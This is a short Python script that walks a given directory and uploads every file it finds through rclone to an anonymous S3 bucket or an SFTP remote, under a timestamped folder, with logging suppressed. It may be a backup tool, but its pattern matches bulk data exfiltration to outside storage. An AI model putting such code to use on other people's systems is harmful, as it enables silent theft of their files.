#!/usr/bin/python3

from datetime import datetime
from rclone_python import rclone
import discover
import sys
import logging

rclone.set_log_level(logging.ERROR)

def is_able():
    if rclone.is_installed():
        print("Rclone is installed.")
        return True
    return False

def copy(file, remote, path):
    if remote == 'aws':
        rclone.copy(file, 'anon-s3:rclone-psahu/uploads/'+path+'/',pbar=None)
    if remote == 'sftp':
        rclone.copy(file, 'backup:/uploads/'+path+'/',pbar=None)

def copydir(dir_path, remote, pathstr=None):
    if pathstr == None:
        now = datetime.now()
        pathstr = now.strftime("%Y%m%d_%H%M%S")
    for f in discover.discoverFiles(dir_path):
        copy(f, remote, pathstr)

if __name__ == "__main__":
    copydir(sys.argv[1], 'aws')
